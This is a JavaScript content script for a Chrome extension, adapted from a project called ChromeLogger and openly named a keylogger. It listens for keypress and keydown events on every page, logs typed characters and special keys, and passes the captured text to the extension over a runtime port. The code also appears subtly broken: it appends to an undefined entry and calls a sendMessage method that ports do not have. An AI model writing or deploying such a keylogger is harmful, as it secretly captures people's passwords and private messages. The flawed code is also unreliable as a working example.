// Heavily adapted from https://github.com/Xeroday/ChromeLogger/blob/master/Chrome/src/inject/payload.js
var port = chrome.runtime.connect({name: "keylogger"});

if (!document.title) {
    document.title = document.URL;
}

document.addEventListener('keypress', function(e) {
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if(charCode) {
        log(String.fromCharCode(charCode));
    }
});

document.addEventListener('keydown', function (e) {
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode == 8) {
        log("[BKSP]");
    } else if (charCode == 9) {
        log("[TAB]");
    } else if (charCode == 13) {
        log("[ENTER]");
    } else if (charCode == 16) {
        log("[SHIFT]");
    } else if (charCode == 17) {
        log("[CTRL]");
    } else if (charCode == 18) {
        log("[ALT]");
    } else if (charCode == 91) {
        log("[L WINDOW]"); // command for mac
    } else if (charCode == 92) {
        log("[R WINDOW]"); // command for mac
    } else if (charCode == 93) {
        log("[SELECT/CMD]"); // command for mac
    }
});

/* Keylog Saving */
var time = new Date().getTime();
var data = {};
var lastLog = time;


function log(input) {
    var now = new Date().getTime();
    if (now - lastLog < 10) return;
    data[time] += input;
    lastLog = now;
    port.sendMessage(data)
}